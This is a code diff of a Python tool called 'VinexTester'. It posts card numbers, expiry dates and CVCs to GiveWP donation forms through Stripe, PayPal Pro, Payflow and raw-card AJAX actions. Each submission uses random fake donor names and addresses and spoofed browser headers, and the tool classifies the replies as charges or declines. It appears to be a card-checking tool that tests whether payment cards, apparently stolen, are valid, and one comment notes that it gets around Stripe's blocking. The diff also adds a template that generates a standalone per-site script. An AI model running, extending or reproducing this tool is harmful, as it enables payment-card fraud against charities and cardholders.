+            if token: fd['stripe_token'] = token; fd['give_stripe_token'] = token
+            if pm: fd['give_stripe_payment_method'] = pm; fd['payment_method_id'] = pm
+            if pid is not None: fd['give-price-id'] = pid
+            fd = self._autofill_required_fields(fd)
+            da = MultipartEncoder({k: (None, str(v) if v is not None else '') for k, v in fd.items()})
+            he = self._get_browser_headers({'Content-Type': da.content_type})
+            for action in ['give_process_donation','give_stripe_process_payment_intent','give_stripe_javascript_payment_intent']:
+                try:
+                    r = self.r.post(self.ajax_url, params={'action': action}, headers=he, data=da, timeout=20)
+                    body = r.text or ''
+                    if '"success":true' in body.lower() and '"error"' not in body.lower(): return f'CHARGE {amt}$', body
+                    real = extract_response_text(body)
+                    if real and is_card_decline(real): return real, body
+                    if real and 'not enabled' not in real.lower() and 'unknown action' not in real.lower(): return real, body
+                except: continue
+            return None, 'STRIPE_NO_RESPONSE'
+        except Exception as e:
+            return None, f'STRIPE_EXC_{type(e).__name__}'
 
     def _stripe_create_pm_via_site(self, n, mm, yy, cvc):
         if not self.ajax_url or not self.id_form2: return None, 'NO_AJAX'
-        actions = ['give_stripe_create_payment_method','give_stripe_get_payment_method',
-                   'give_stripe_create_setup_intent','give_stripe_create_payment_intent',
-                   'give_create_payment_method']
+        actions = ['give_stripe_create_payment_method','give_stripe_get_payment_method','give_stripe_create_setup_intent','give_stripe_create_payment_intent','give_create_payment_method']
         full_name = f'{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}'
         for action in actions:
             payloads = [
@@ -1566,8 +1554,7 @@ class VinexTester:
             ]
             for payload in payloads:
                 try:
-                    r = self._safe_post(self.ajax_url, data=payload,
-                                        headers=self._get_browser_headers(), timeout=10)
+                    r = self._safe_post(self.ajax_url, data=payload, headers=self._get_browser_headers(), timeout=10)
                     if not r or r.status_code != 200: continue
                     body = r.text or ''
                     try:
@@ -1591,198 +1578,184 @@ class VinexTester:
         expiry_slash = f'{mm}/{yy}'
         full_name = f'{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}'
         base_fd = {
-            'give-form-id-prefix': self.id_form1 or '',
-            'give-form-id': self.id_form2 or '',
-            'give-form-hash': self.nonce or '',
-            'give-amount': amt,
-            'give-currency': self.currency,
-            'payment-mode': 'stripe',
-            'give-gateway': 'stripe',
-            'give_first': random.choice(FIRST_NAMES),
-            'give_last': random.choice(LAST_NAMES),
-            'give_email': self.email,
-            'give_agree_to_terms': 'on',
+            'give-form-id-prefix': self.id_form1 or '', 'give-form-id': self.id_form2 or '',
+            'give-form-hash': self.nonce or '', 'give-amount': amt, 'give-currency': self.currency,
+            'payment-mode': 'stripe', 'give-gateway': 'stripe',
+            'give_first': random.choice(FIRST_NAMES), 'give_last': random.choice(LAST_NAMES),
+            'give_email': self.email, 'give_agree_to_terms': 'on',
         }
         if pid is not None: base_fd['give-price-id'] = pid
         base_fd = self._autofill_required_fields(base_fd)
         base_fd = self._autofill_card_fields(base_fd, n, mm, yy, cvc)
         card_fields = {
-            'card_number': n, 'cardNumber': n, 'card-number': n,
-            'cc_number': n, 'ccnum': n, 'cc-number': n,
-            'credit_card_number': n, 'credit-card-number': n,
-            'card_no': n, 'cardno': n,
-            'card_cvc': cvc, 'cardCVC': cvc, 'cvc': cvc, 'cvv': cvc,
-            'cvv2': cvc, 'csc': cvc, 'card_cvv': cvc,
-            'security_code': cvc, 'card_security_code': cvc,
-            'card_expiry': expiry_slash, 'cardExpiry': expiry_slash,
-            'card-expiry': expiry_slash, 'card_exp': expiry_slash,
-            'expiry': expiry_slash, 'exp-date': expiry_slash,
+            'card_number': n, 'cardNumber': n, 'card_cvc': cvc, 'cardCVC': cvc,
+            'cvc': cvc, 'cvv': cvc, 'cvv2': cvc, 'csc': cvc,
+            'card_expiry': expiry_slash, 'cardExpiry': expiry_slash, 'card_exp': expiry_slash,
             'exp_month': mm, 'exp_year': f'20{yy}',
-            'card_exp_month': mm, 'card_exp_year': f'20{yy}',
-            'card_name': full_name, 'cardName': full_name,
-            'card_holder': full_name, 'cardholder_name': full_name,
-            'cardholder-name': full_name, 'name_on_card': full_name,
+            'card_name': full_name, 'card_holder': full_name,
             'card_zip': '10001', 'billing_zip': '10001',
-            'card_postal': '10001', 'postal_code': '10001',
-            'card_address': '123 Main St', 'billing_address': '123 Main St',
-            'card_city': 'New York', 'billing_city': 'New York',
-            'card_state': 'NY', 'billing_state': 'NY',
-            'card_country': 'US', 'billing_country': 'US',
         }
         pm_token, _ = self._stripe_create_pm_via_site(n, mm, yy, cvc)
-        actions = ['give_stripe_create_payment_intent','give_stripe_process_payment_intent',
-                   'give_stripe_confirm_payment_intent','give_stripe_create_setup_intent',
-                   'give_stripe_javascript_payment_intent','give_process_donation',
-                   'give_purchase','give_process_donation_stripe',
-                   'give_process_cc_donation','give_cc_process_donation']
-        all_errors = []
+        actions = ['give_stripe_create_payment_intent','give_stripe_process_payment_intent','give_stripe_javascript_payment_intent','give_process_donation','give_stripe_confirm_payment_intent']
         for action in actions:
             v1 = dict(base_fd); v1.update(card_fields)
             if pm_token: v1['payment_method'] = pm_token; v1['payment_method_id'] = pm_token
-            v2 = dict(base_fd)
-            v2['card[number]'] = n; v2['card[cvc]'] = cvc
-            v2['card[exp_month]'] = mm; v2['card[exp_year]'] = f'20{yy}'
-            if pm_token: v2['payment_method'] = pm_token
-            variants = [v1, v2]
-            if pm_token:
-                v3 = dict(base_fd)
-                v3['payment_method'] = pm_token; v3['payment_method_id'] = pm_token
-                v3['give_stripe_payment_method'] = pm_token
-                variants.append(v3)
-            variants.append(dict(base_fd))
-            for i, payload in enumerate(variants):
+            try:
+                da = MultipartEncoder({k: (None, str(v) if v is not None else '') for k, v in v1.items()})
+                headers = self._get_browser_headers({'Content-Type': da.content_type})
+                r = self.r.post(self.ajax_url, params={'action': action}, headers=headers, data=da, timeout=20)
+                body = r.text or ''
+                if r.status_code != 200: continue
+                if '"success":true' in body.lower() and '"error"' not in body.lower(): return f'CHARGE {amt}$', body
+                real = extract_response_text(body)
+                if real and is_card_decline(real): return real, body
+                if 'not enabled' in body.lower() or 'unknown action' in body.lower(): continue
+                if real and any(k in real.lower() for k in ('card','declined','expired','insufficient','cvc','reject')): return real, body
+            except: continue
+        return None, 'SITE_AJAX_FAILED'
+
+    def _attempt_paypal_payflow(self, n, mm, yy, cvc, amt, pid=None, mode='paypalpro_payflow'):
+        try:
+            self._current_gateway_name = 'paypal_payflow'
+            expiry = f'{mm}{yy}'
+            full_name = f'{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}'
+            fd = {
+                'give-form-id-prefix': self.id_form1 or '', 'give-form-id': self.id_form2 or '',
+                'give-form-hash': self.nonce or '', 'give-amount': amt, 'give-currency': self.currency,
+                'payment-mode': mode, 'give-gateway': mode,
+                'give_first': random.choice(FIRST_NAMES), 'give_last': random.choice(LAST_NAMES),
+                'give_email': self.email, 'give_agree_to_terms': 'on',
+                'card_number': n, 'card_cvc': cvc, 'card_expiry': expiry,
+                'card_exp_month': mm, 'card_exp_year': yy, 'card_name': full_name,
+                'card_address': '123 Main St', 'card_city': 'New York',
+                'card_state': 'NY', 'card_zip': '10001', 'card_country': 'US',
+            }
+            if pid is not None: fd['give-price-id'] = pid
+            fd = self._autofill_required_fields(fd)
+            fd = self._autofill_card_fields(fd, n, mm, yy, cvc)
+            da = MultipartEncoder({k: (None, str(v) if v is not None else '') for k, v in fd.items()})
+            he = self._get_browser_headers({'Content-Type': da.content_type})
+            for action in ['give_paypal_pro_payflow_purchase','give_payflow_purchase','give_paypal_payflow_purchase','give_process_donation']:
                 try:
-                    da = MultipartEncoder({k: (None, str(v) if v is not None else '') for k, v in payload.items()})
-                    headers = self._get_browser_headers({'Content-Type': da.content_type})
-                    r = self.r.post(self.ajax_url, params={'action': action}, headers=headers, data=da, timeout=20)
+                    r = self.r.post(self.ajax_url, params={'action': action}, headers=he, data=da, timeout=20)
                     body = r.text or ''
-                    if r.status_code != 200:
-                        all_errors.append(f'{action}_{i}: HTTP_{r.status_code}'); continue
-                    if '"success":true' in body.lower() and '"error"' not in body.lower():
-                        return f'CHARGE {amt}$', body
+                    if r.status_code != 200: continue
+                    if '"success":true' in body.lower() and '"error"' not in body.lower(): return f'CHARGE {amt}$', body
                     real = extract_response_text(body)
                     if real and is_card_decline(real): return real, body
-                    if 'not enabled' in body.lower() or 'unknown action' in body.lower() or 'invalid action' in body.lower():
-                        all_errors.append(f'{action}_{i}: unknown'); continue
-                    if real and real.strip():
-                        all_errors.append(f'{action}_{i}: {real[:80]}')
-                        if any(k in real.lower() for k in ('card', 'declined', 'expired', 'insufficient', 'cvc', 'cvv', 'security', 'reject')):
-                            return real, body
-                except Exception as e:
-                    all_errors.append(f'{action}_{i}: {type(e).__name__}')
-                    continue
-        if all_errors: return None, f'SITE_AJAX_FAILED: {"; ".join(all_errors[:5])[:300]}'
-        return None, 'SITE_AJAX_NO_RESPONSE'
+                    if 'unknown action' in body.lower() or 'not enabled' in body.lower(): continue
+                    if real: return real, body
+                except: continue
+            return None, 'PAYFLOW_FAILED'
+        except: return None, 'PAYFLOW_EXC'
 
-    def _attempt_stripe_charge(self, n, mm, yy, cvc, amt, pid=None, payment_mode='stripe'):
+    def _attempt_paypal_pro(self, n, mm, yy, cvc, amt, pid=None, mode='paypalpro'):
         try:
-            if not self.stripe_pk: return None, 'STRIPE_NO_PK'
-            # Primary: site AJAX (bypasses Stripe block)
-            site_result, site_text = self._stripe_via_site_ajax(n, mm, yy, cvc, amt, pid=pid)
-            if site_result: return site_result, site_text
-            # Secondary: direct Stripe
-            if self.stripe_blocked: return None, 'STRIPE_BLOCKED_SKIP'
-            pm, _ = self._stripe_create_pm_via_site(n, mm, yy, cvc)
-            if pm:
-                fd = {
-                    'give-form-id-prefix': self.id_form1 or '',
-                    'give-form-id': self.id_form2 or '',
-                    'give-form-hash': self.nonce or '',
-                    'give-amount': amt,
-                    'give-currency': self.currency,
-                    'payment-mode': payment_mode,
-                    'give-gateway': payment_mode,
-                    'give_first': random.choice(FIRST_NAMES),
-                    'give_last': random.choice(LAST_NAMES),
-                    'give_email': self.email,
-                    'give_agree_to_terms': 'on',
-                    'payment_method': pm, 'payment_method_id': pm,
-                    'give_stripe_payment_method': pm,
-                }
-                if pid is not None: fd['give-price-id'] = pid
-                fd = self._autofill_required_fields(fd)
-                for action in ['give_stripe_process_payment_intent', 'give_process_donation']:
-                    try:
-                        da = MultipartEncoder({k: (None, str(v) if v is not None else '') for k, v in fd.items()})
-                        headers = self._get_browser_headers({'Content-Type': da.content_type})
-                        r = self.r.post(self.ajax_url, params={'action': action}, headers=headers, data=da, timeout=20)
-                        body = r.text or ''
-                        if '"success":true' in body.lower() and '"error"' not in body.lower():
-                            return f'CHARGE {amt}$', body
-                        real = extract_response_text(body)
-                        if real and is_card_decline(real): return real, body
-                    except: continue
-            # Direct Stripe (last resort)
-            browser_headers = self._get_browser_headers({
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Stripe-Version': '2023-10-16',
-                'Sec-Fetch-Site': 'cross-site',
-            })
+            self._current_gateway_name = 'paypal_pro'
+            expiry = f'{mm}{yy}'
+            full_name = f'{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}'
+            fd = {
+                'give-form-id-prefix': self.id_form1 or '', 'give-form-id': self.id_form2 or '',
+                'give-form-hash': self.nonce or '', 'give-amount': amt, 'give-currency': self.currency,
+                'payment-mode': mode, 'give-gateway': mode,
+                'give_first': random.choice(FIRST_NAMES), 'give_last': random.choice(LAST_NAMES),
+                'give_email': self.email, 'give_agree_to_terms': 'on',
+                'card_number': n, 'card_cvc': cvc, 'card_expiry': expiry,
+                'card_exp_month': mm, 'card_exp_year': yy, 'card_name': full_name,
+                'billing_first_name': random.choice(FIRST_NAMES), 'billing_last_name': random.choice(LAST_NAMES),
+                'billing_email': self.email, 'billing_address_1': '123 Main St',
+                'billing_city': 'New York', 'billing_state': 'NY', 'billing_zip': '10001', 'billing_country': 'US',
+            }
+            if pid is not None: fd['give-price-id'] = pid
+            fd = self._autofill_required_fields(fd)
+            fd = self._autofill_card_fields(fd, n, mm, yy, cvc)
+            da = MultipartEncoder({k: (None, str(v) if v is not None else '') for k, v in fd.items()})
+            he = self._get_browser_headers({'Content-Type': da.content_type})
+            for action in ['give_paypal_pro_purchase','give_paypal_pro_process','give_process_donation']:
+                try:
+                    r = self.r.post(self.ajax_url, params={'action': action}, headers=he, data=da, timeout=20)
+                    body = r.text or ''
+                    if '"success":true' in body.lower() and '"error"' not in body.lower(): return f'CHARGE {amt}$', body
+                    real = extract_response_text(body)
+                    if real and is_card_decline(real): return real, body
+                    if 'unknown action' in body.lower(): continue
+                    if real: return real, body
+                except: continue
+            return None, 'PP_PRO_FAILED'
+        except: return None, 'PP_PRO_EXC'
+
+    def _attempt_paypal_standard(self, n, mm, yy, cvc, amt, pid=None, mode='paypal'):
+        try:
+            self._current_gateway_name = 'paypal_standard'
+            fd = {
+                'give-form-id-prefix': self.id_form1 or '', 'give-form-id': self.id_form2 or '',
+                'give-form-hash': self.nonce or '', 'give-amount': amt, 'give-currency': self.currency,
+                'payment-mode': mode, 'give-gateway': mode,
+                'give_first': random.choice(FIRST_NAMES), 'give_last': random.choice(LAST_NAMES),
+                'give_email': self.email, 'give_agree_to_terms': 'on',
+            }
+            if pid is not None: fd['give-price-id'] = pid
+            fd = self._autofill_required_fields(fd)
+            da = MultipartEncoder({k: (None, str(v) if v is not None else '') for k, v in fd.items()})
+            he = self._get_browser_headers({'Content-Type': da.content_type})
+            for action in ['give_paypal_standard_purchase','give_paypal_standard_process','give_process_donation']:
+                try:
+                    r = self.r.post(self.ajax_url, params={'action': action}, headers=he, data=da, timeout=20)
+                    body = r.text or ''
+                    if '"success":true' in body.lower() and '"error"' not in body.lower():
+                        m = re.search(r'https?://(?:www\.)?paypal\.com[^"\'\s]+', body)
+                        if m: return 'PAYPAL_STANDARD: Redirect required', body
+                        return 'PAYPAL_STANDARD: Order created', body
+                    real = extract_response_text(body)
+                    if real and is_card_decline(real): return real, body
+                except: continue
+            return None, 'PAYPAL_STANDARD_FAILED'
+        except: return None, 'PP_STD_EXC'
+
+    def _attempt_generic_dispatch(self, n, mm, yy, cvc, amt, pid=None, mode='paypal-commerce'):
+        try:
+            self._current_gateway_name = f'generic_{mode}'
+            fd = {
+                'give-form-id-prefix': self.id_form1 or '', 'give-form-id': self.id_form2 or '',
+                'give-form-hash': self.nonce or '', 'give-amount': amt, 'give-currency': self.currency,
+                'payment-mode': mode, 'give-gateway': mode,
+                'give_first': random.choice(FIRST_NAMES), 'give_last': random.choice(LAST_NAMES),
+                'give_email': self.email, 'give_agree_to_terms': 'on',
+            }
+            if pid is not None: fd['give-price-id'] = pid
+            fd = self._autofill_required_fields(fd)
+            fd = self._autofill_card_fields(fd, n, mm, yy, cvc)
+            da = MultipartEncoder({k: (None, str(v) if v is not None else '') for k, v in fd.items()})
+            he = self._get_browser_headers({'Content-Type': da.content_type})
             try:
-                r = self.r.post('https://api.stripe.com/v1/payment_methods',
-                    auth=(self.stripe_pk, ''), headers=browser_headers,
-                    data={'type': 'card', 'card[number]': n, 'card[exp_month]': str(mm),
-                          'card[exp_year]': str(yy), 'card[cvc]': str(cvc)}, timeout=20)
-                if r.status_code == 200:
-                    try: pm2 = r.json().get('id')
-                    except: pm2 = None
-                    if pm2:
-                        fd = {
-                            'give-form-id-prefix': self.id_form1 or '',
-                            'give-form-id': self.id_form2 or '',
-                            'give-form-hash': self.nonce or '',
-                            'give-amount': amt, 'give-currency': self.currency,
-                            'payment-mode': payment_mode, 'give-gateway': payment_mode,
-                            'give_first': random.choice(FIRST_NAMES),
-                            'give_last': random.choice(LAST_NAMES),
-                            'give_email': self.email, 'give_agree_to_terms': 'on',
-                            'payment_method': pm2, 'payment_method_id': pm2,
-                        }
-                        if pid is not None: fd['give-price-id'] = pid
-                        fd = self._autofill_required_fields(fd)
-                        da = MultipartEncoder({k: (None, str(v) if v is not None else '') for k, v in fd.items()})
-                        headers = self._get_browser_headers({'Content-Type': da.content_type})
-                        r2 = self.r.post(self.ajax_url, params={'action': 'give_process_donation'}, headers=headers, data=da, timeout=20)
-                        body = r2.text or ''
-                        if '"success":true' in body.lower() and '"error"' not in body.lower():
-                            return f'CHARGE {amt}$', body
-                        real = extract_response_text(body)
-                        if real and is_card_decline(real): return real, body
-                        return None, f'STRIPE_PM_FAIL: {real[:100]}'
-                else:
-                    err_body = (r.text or '').lower()
-                    if 'unsupported' in err_body or 'integration surface' in err_body:
-                        self.stripe_blocked = True
-                    return None, f'STRIPE_TOKEN: {(r.text or "")[:150]}'
-            except Exception as e:
-                return None, f'STRIPE_TOKEN_EXC: {type(e).__name__}'
-            if site_text: return None, site_text
-            return None, 'STRIPE_NO_RESPONSE'
-        except Exception as e:
-            return None, f'STRIPE_EXC: {type(e).__name__}: {str(e)[:100]}'
+                r = self.r.post(self.ajax_url, params={'action': 'give_process_donation'}, headers=he, data=da, timeout=25)
+                body = r.text or ''
+                if '"success":true' in body.lower() and '"error"' not in body.lower(): return f'CHARGE {amt}$', body
+                real = extract_response_text(body)
+                if real and is_card_decline(real): return real, body
+                if 'not enabled' in body.lower(): return None, f'GATEWAY_NOT_ENABLED: {mode}'
+                if real: return real, body
+                return None, f'DISPATCH_NO_RESPONSE: {mode}'
+            except: return None, 'DISPATCH_EXC'
+        except: return None, 'DISPATCH_FATAL'
 
     def _attempt_raw_card(self, n, mm, yy, cvc, amt, pid=None, mode='credit-card'):
         try:
+            self._current_gateway_name = f'raw_card_{mode}'
             expiry_slash = f'{mm}/{yy}'
             full_name = f'{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}'
             fd = {
-                'give-form-id-prefix': self.id_form1 or '',
-                'give-form-id': self.id_form2 or '',
-                'give-form-hash': self.nonce or '',
-                'give-amount': amt, 'give-currency': self.currency,
+                'give-form-id-prefix': self.id_form1 or '', 'give-form-id': self.id_form2 or '',
+                'give-form-hash': self.nonce or '', 'give-amount': amt, 'give-currency': self.currency,
                 'payment-mode': mode, 'give-gateway': mode,
-                'give_first': random.choice(FIRST_NAMES),
-                'give_last': random.choice(LAST_NAMES),
+                'give_first': random.choice(FIRST_NAMES), 'give_last': random.choice(LAST_NAMES),
                 'give_email': self.email, 'give_agree_to_terms': 'on',
-                'card_number': n, 'cardNumber': n, 'card-number': n,
-                'cc_number': n, 'ccnumber': n, 'cc-number': n,
-                'card_cvc': cvc, 'cardCVC': cvc, 'card-cvc': cvc,
+                'card_number': n, 'cardNumber': n, 'card_cvc': cvc, 'cardCVC': cvc,
                 'cvc': cvc, 'cvv': cvc, 'cvv2': cvc, 'csc': cvc,
                 'card_expiry': expiry_slash, 'cardExpiry': expiry_slash,
-                'card-expiry': expiry_slash, 'card_exp': expiry_slash,
-                'expiry': expiry_slash, 'exp_month': mm, 'exp_year': f'20{yy}',
-                'card_name': full_name, 'cardName': full_name,
-                'cardholder_name': full_name, 'card_holder': full_name,
+                'card_exp': expiry_slash, 'expiry': expiry_slash,
+                'exp_month': mm, 'exp_year': f'20{yy}',
+                'card_name': full_name, 'cardholder_name': full_name,
                 'card_zip': '10001', 'card_postal': '10001',
                 'card_address': '123 Main St', 'card_city': 'New York',
                 'card_state': 'NY', 'card_country': 'US',
@@ -1791,31 +1764,20 @@ class VinexTester:
             fd = self._autofill_required_fields(fd)
             fd = self._autofill_card_fields(fd, n, mm, yy, cvc)
             da = MultipartEncoder({k: (None, str(v) if v is not None else '') for k, v in fd.items()})
-            he = {'content-type': da.content_type, 'user-agent': self.uu.random,
-                  'x-requested-with': 'XMLHttpRequest', 'referer': self.page_url, 'origin': f'https://{self.url}'}
-            actions = ['give_process_donation', 'give_process_cc_donation',
-                       'give_cc_process_donation', f'give_{mode.replace("-","_")}_process']
-            all_errors = []
-            for action in actions:
+            he = self._get_browser_headers({'Content-Type': da.content_type})
+            for action in ['give_process_donation','give_process_cc_donation','give_cc_process_donation']:
                 try:
-                    r2 = self.r.post(self.ajax_url, params={'action': action}, headers=he, data=da, timeout=20)
-                    body = r2.text or ''
-                    if r2.status_code != 200:
-                        all_errors.append(f'{action}: HTTP_{r2.status_code}'); continue
-                    if '"success":true' in body.lower() and '"error"' not in body.lower():
-                        return f'CHARGE {amt}$', body
+                    r = self.r.post(self.ajax_url, params={'action': action}, headers=he, data=da, timeout=20)
+                    body = r.text or ''
+                    if r.status_code != 200: continue
+                    if '"success":true' in body.lower() and '"error"' not in body.lower(): return f'CHARGE {amt}$', body
                     real = extract_response_text(body)
                     if real and is_card_decline(real): return real, body
-                    if 'not enabled' in body.lower():
-                        all_errors.append(f'{action}: not enabled'); continue
-                    if real and 'no process' in real.lower(): continue
+                    if 'not enabled' in body.lower(): continue
                     if real: return real, body
-                except Exception as e:
-                    all_errors.append(f'{action}: {type(e).__name__}')
-            if all_errors: return None, f'RAW_ALL_FAILED: {"; ".join(all_errors)[:200]}'
-            return None, 'RAW_NO_RESPONSE'
-        except Exception as e:
-            return None, f'RAW_FATAL: {type(e).__name__}'
+                except: continue
+            return None, 'RAW_ALL_FAILED'
+        except: return None, 'RAW_FATAL'
 
     def Charge(self, ccx, thorough=False):
         try:
@@ -1832,16 +1794,12 @@ class VinexTester:
             if len(mm) != 2 or not (1 <= int(mm) <= 12): return 'INVALID_EXPIRY_MONTH'
             if len(cvc) < 3 or len(cvc) > 4: return 'INVALID_CVV'
             if not self.ajax_url or 'invalid.local' in self.ajax_url: return 'INVALID_SITE'
-
             if not self.id_form2:
                 fid = self._find_form_id_comprehensive()
-                if fid:
-                    self.id_form2 = fid; self.id_form1 = f'{fid}-1'
+                if fid: self.id_form2 = fid; self.id_form1 = f'{fid}-1'
                 else:
-                    if not self.is_givewp:
-                        return 'NOT_GIVEWP: Site does not use GiveWP'
+                    if not self.is_givewp: return 'NOT_GIVEWP: Site does not use GiveWP'
                     return 'FORM_ERROR: form-id missing (GiveWP detected)'
-
             if not self.nonce:
                 self._try_ajax_nonce()
                 if not self.nonce: self._refresh_nonce()
@@ -1852,30 +1810,42 @@ class VinexTester:
                 if not self._pick_valid_token():
                     if self._try_ajax_client_token(): self._pick_valid_token()
 
+            # Build attempts
             attempts_gw = []; seen = set()
             def add(gw, mode):
                 k = (gw, mode)
                 if k not in seen: seen.add(k); attempts_gw.append(k)
 
             if self.actual_payment_mode:
-                m = self.actual_payment_mode
-                if m == 'stripe' and self.has_stripe: add('stripe', 'stripe')
-                elif m == 'paypal-commerce': add('paypal', m)
-                elif m in ('credit-card', 'card', 'cc'): add('raw_card', m)
-                else: add('paypal', m)
+                m = self.actual_payment_mode; ml = m.lower()
+                if 'payflow' in ml: add('paypal_payflow', m)
+                elif 'paypalpro' in ml: add('paypal_pro', m)
+                elif 'commerce' in ml: add('paypal_commerce', m)
+                elif 'braintree' in ml: add('generic_dispatch', m)
+                elif ml == 'paypal': add('paypal_standard', m)
+                elif 'stripe' in ml and self.has_stripe: add('stripe', m)
+                elif any(k in ml for k in ('credit','card','cc')): add('raw_card', m)
+                else: add('generic_dispatch', m)
+            for mode in self.paypal_modes:
+                ml = mode.lower()
+                if 'payflow' in ml: add('paypal_payflow', mode)
+                elif 'paypalpro' in ml: add('paypal_pro', mode)
+                elif 'commerce' in ml: add('paypal_commerce', mode)
+                elif 'braintree' in ml: add('generic_dispatch', mode)
+                elif ml == 'paypal': add('paypal_standard', mode)
+            if self.has_stripe and self.stripe_pk: add('stripe', 'stripe')
+            if self.has_paypal_commerce: add('paypal_commerce', 'paypal-commerce')
             for mode in self.all_card_modes:
                 ml = mode.lower()
                 if 'stripe' in ml and self.has_stripe: add('stripe', mode)
                 elif any(k in ml for k in ('credit','card','cc')): add('raw_card', mode)
-            if self.has_stripe and self.stripe_pk: add('stripe', 'stripe')
-            if self.has_paypal_commerce: add('paypal', 'paypal-commerce')
-            if self.has_card_fields:
-                for mode in ('credit-card', 'card', 'cc', 'credit_card'):
-                    add('raw_card', mode)
+            if self.has_card_fields: add('raw_card', 'credit-card')
             if not attempts_gw:
-                add('paypal', 'paypal-commerce')
+                add('paypal_commerce', 'paypal-commerce')
+                add('generic_dispatch', 'paypal')
                 add('raw_card', 'credit-card')
 
+            # Pairs
             pairs = []
             if self.price_levels:
                 for pid, amt in sorted(self.price_levels, key=lambda x: x[1]):
@@ -1890,17 +1860,24 @@ class VinexTester:
 
             for gw_type, gw_mode in attempts_gw:
                 if gw_type == 'stripe' and not self.stripe_pk: continue
-                if gw_type == 'paypal' and not self.au:
+                if gw_type == 'paypal_commerce' and not self.au:
                     self._extract_tokens_ultimate()
                     if not self._pick_valid_token():
                         if self._try_ajax_client_token(): self._pick_valid_token()
-
                 for pid, amt in pairs:
                     try:
                         if gw_type == 'stripe':
                             result, text = self._attempt_stripe_charge(n, mm, yy, cvc, amt, pid=pid, payment_mode=gw_mode)
                         elif gw_type == 'raw_card':
                             result, text = self._attempt_raw_card(n, mm, yy, cvc, amt, pid=pid, mode=gw_mode)
+                        elif gw_type == 'paypal_payflow':
+                            result, text = self._attempt_paypal_payflow(n, mm, yy, cvc, amt, pid=pid, mode=gw_mode)
+                        elif gw_type == 'paypal_pro':
+                            result, text = self._attempt_paypal_pro(n, mm, yy, cvc, amt, pid=pid, mode=gw_mode)
+                        elif gw_type == 'paypal_standard':
+                            result, text = self._attempt_paypal_standard(n, mm, yy, cvc, amt, pid=pid, mode=gw_mode)
+                        elif gw_type == 'generic_dispatch':
+                            result, text = self._attempt_generic_dispatch(n, mm, yy, cvc, amt, pid=pid, mode=gw_mode)
                         else:
                             result, text = self._attempt_charge(n, mm, yy, cvc, amt, pid=pid, payment_mode=gw_mode)
                         if result and result.startswith('AUTH_FAILURE'):
@@ -1909,14 +1886,14 @@ class VinexTester:
                                 self.token_candidates = []; self.au = None
                                 self._refresh_nonce(); self._extract_tokens_ultimate()
                                 if self._pick_valid_token():
-                                    if gw_type == 'paypal':
+                                    if gw_type == 'paypal_commerce':
                                         result, text = self._attempt_charge(n, mm, yy, cvc, amt, pid=pid, payment_mode=gw_mode)
                                         if result and not result.startswith('AUTH_FAILURE'):
-                                            all_results.append({'amount': amt, 'result': result, 'text': text, 'pid': pid, 'gateway': gw_type})
+                                            all_results.append({'amount': amt, 'result': result, 'text': text, 'pid': pid, 'gateway': gw_type, 'response_gateway': self._current_gateway_name or gw_type})
                                             continue
                             create_errors.append((amt, 'AUTH_REFRESH'))
                         elif result:
-                            all_results.append({'amount': amt, 'result': result, 'text': text, 'pid': pid, 'gateway': gw_type})
+                            all_results.append({'amount': amt, 'result': result, 'text': text, 'pid': pid, 'gateway': gw_type, 'response_gateway': self._current_gateway_name or gw_type})
                             if is_card_decline(result) and not real_decline:
                                 real_decline = result
                         elif not result:
@@ -1928,6 +1905,7 @@ class VinexTester:
             if all_results:
                 best = max(all_results, key=lambda x: score_result(x['result']))
                 self.donation = best['amount']
+                self.response_gateway = best.get('response_gateway') or best.get('gateway') or self.gateway_type
                 return normalize_result(best['result'])
             if create_errors:
                 last_amt, last_err = create_errors[-1]
@@ -1937,9 +1915,7 @@ class VinexTester:
         except Exception as e:
             return f'FATAL_{type(e).__name__}: {str(e)[:100]}'
 
-# ═══════════════════════════════════════════════════════════════════════════════
-#   BRIDGE
-# ═══════════════════════════════════════════════════════════════════════════════
+# ═══════════ BRIDGE ═══════════
 def check_single_link(link, thorough=True):
     try:
         link = safe_url(link)
@@ -1955,11 +1931,9 @@ def check_single_link(link, thorough=True):
     except:
         return {'link': str(link)[:100] if link else 'Invalid', 'live': False, 'respons': 'FATAL', 'amount': '1.00', 'tester': None}
 
-# ═══════════════════════════════════════════════════════════════════════════════
-#   GATEWAY TEMPLATE (compact version — full version available on request)
-# ═══════════════════════════════════════════════════════════════════════════════
+# ═══════════ GATEWAY TEMPLATE ═══════════
 GATEWAY_TEMPLATE_STR = r'''#!/usr/bin/env python3
-# VINEX Gateway v23
+# VINEX Gateway v23.1
 import requests, random, time, re, base64, json, os, sys
 try:
     from fake_useragent import UserAgent
@@ -1967,7 +1941,7 @@ try:
     def rand_ua():
         try: return _UU.random
         except: return 'Mozilla/5.0'
-except: 
+except:
     def rand_ua(): return 'Mozilla/5.0'
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 import urllib3
@@ -1976,7 +1950,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 PAGE_URL="$page_url"; AJAX_URL="$ajax_url"; ID_FORM1="$id_form1"; ID_FORM2="$id_form2"
 NONCE="$nonce"; ACCESS_TOKEN="$access_token"; PAYPAL_META="$paypal_meta"; CLIENT_ID="$client_id"
 STRIPE_PK="$stripe_pk"; CURRENCY="$currency"; MINIMUM="$minimum"; CURRENT_PID="$current_pid"
-PRICE_LEVELS=$price_levels_json; FORM_FIELDS=$form_fields_json; CARD_MODES=$card_modes_json
+PRICE_LEVELS=$price_levels_json; FORM_FIELDS=$form_fields_json
 HOST=PAGE_URL.split('//')[-1].split('/')[0]
 FIRST_NAMES=['James','John','Robert','Michael']; LAST_NAMES=['Smith','Johnson','Williams','Brown']
 BASE_AMOUNTS=['1.00','3.00','5.00']
@@ -2024,8 +1998,7 @@ def is_valid_option(o):
